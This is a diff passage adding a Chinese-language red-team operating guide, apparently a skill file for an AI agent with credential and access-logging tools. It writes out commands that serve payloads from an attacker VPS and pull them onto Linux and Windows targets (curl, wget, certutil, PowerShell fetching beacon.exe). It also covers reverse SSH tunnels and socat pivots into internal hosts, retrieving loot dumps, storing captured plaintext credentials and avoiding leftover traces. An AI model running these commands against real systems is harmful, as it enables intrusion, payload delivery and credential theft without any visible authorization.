+$VPS serve 9100 ~/rt/payloads        # VPS 上起 HTTP 服务
+$VPS push ./suo5 /home/ubuntu/rt/payloads/
+# 目标侧（Linux）
+curl -O http://<你的VPS_IP>:9100/suo5  或  wget http://<你的VPS_IP>:9100/suo5
+# 目标侧（Windows）
+certutil -urlcache -split -f http://<你的VPS_IP>:9100/beacon.exe C:\Windows\Temp\a.exe
+powershell -c "iwr http://<你的VPS_IP>:9100/beacon.exe -OutFile C:\Windows\Temp\a.exe"
+```
+
+**取回战利品**：`$VPS get /home/ubuntu/rt/loot/dump.zip ~/.dsh/redteam/engagements/<靶标>/runs/`
+
+## 反向隧道与中转
+
+目标在内网、本机不可达时，用 VPS 当跳板：
+
+```bash
+# 反向隧道：VPS:9200 → 目标内网 10.0.0.5:8080（在目标上执行）
+ssh -R 9200:10.0.0.5:8080 -N -f -o StrictHostKeyChecking=no -i <目标上的密钥> ubuntu@<你的VPS_IP>
+# 之后本机经 VPS 访问：ssh -L 8080:127.0.0.1:9200 ubuntu@<你的VPS_IP>
+
+# socat 端口转发（VPS 上）
+$VPS sh "tmux new-session -d -s fwd-9200 'socat TCP-LISTEN:9200,reuseaddr,fork TCP:10.0.0.5:8080'"
+```
+
+WebShell 场景配合技能 `suo5-tunnel`：把 suo5 客户端放本机，服务端传到目标，隧道出口经 VPS 更稳。
+
+## 纪律（务必遵守）
+
+1. **端口纪律**：只用 9000-9999，开监听前先 `$VPS port` 或 `$VPS status` 确认空闲；**绝不占用/杀掉 9001、9007、9009 与 `cap/sh/up/www` 会话**。
+2. **每次用完必须 `$VPS kill <port>`**，不要留下裸监听（既是资源占用也是痕迹）。
+3. **凭据落库、不留 VPS**：目标上抓到的口令/哈希用 `redteam_credential_add` 写进本机资产库（明文 `secret_value`），产物落本机 `runs/`；**不要把凭据写进 VPS 家目录**。
+4. **VPS IP 对目标可见**：它属于本次演练的基础设施，不要在目标上留下包含它之外的额外个人信息。
+5. **落库**：每次成功拿到 shell 用 `redteam_access_add` 记录（host/账号/方式/权限/会话引用），每条凭据用 `redteam_credential_add` 记录，攻击脚本用 `redteam_attack_file_add` 归档。
+6. **`send` 出去的每条命令都要能从 `read` 的输出里拿到证据**，重要输出先重定向到文件再 `get` 回来，避免 tmux 回滚缓冲被刷掉。
+
+## 排障
+
+| 现象 | 处理 |
+| --- | --- |
+| 目标回连不上 | 先确认监听真在：`$VPS sessions` + `$VPS sh "ss -ltnp \| grep <port>"`；再确认目标出网（目标上 `curl -s http://<你的VPS_IP>:<port>` 若返回连接成功说明端口可达） |
+| 端口在范围外/换端口 | 云安全组只放了 9000-9999，超范围必失败 |
+| 反复掉线 | 目标侧加 `while true` 重连循环；或用 socat 全 TTY 方案 |
+| 有回显但命令不执行 | payload 被 URL 截断（`&`/`>`），整体 URL 编码 |
+| 中文乱码 | 目标上 `export LANG=C.UTF-8`，或先 `read` 前把 tmux 设置 `tmux set -t rt-<port> utf8 on` |
+| 无 TTY、`sudo` 报错 | 升级 PTY（见上） |
+| 本机探测端口"全部可连" | 本机网关会对任意端口回 SYN-ACK，**本机 `nc -z` 不能判断 VPS 端口可达性**；要用外部节点或目标本身验证 |
+
+## 与其他技能的关系
+
+- `suo5-tunnel`：WebShell → SOCKS5 隧道，出口可以走本 VPS
+- `webshell-toolkit`：冰蝎/哥斯拉/蚁剑，拿到 WebShell 后的管理
+- `cn-proxy-pool`：需要国内出口 IP 时叠加代理（不要改动本机网络配置）
+- `active-scan` / `fofa-recon`：内网可达后继续测绘
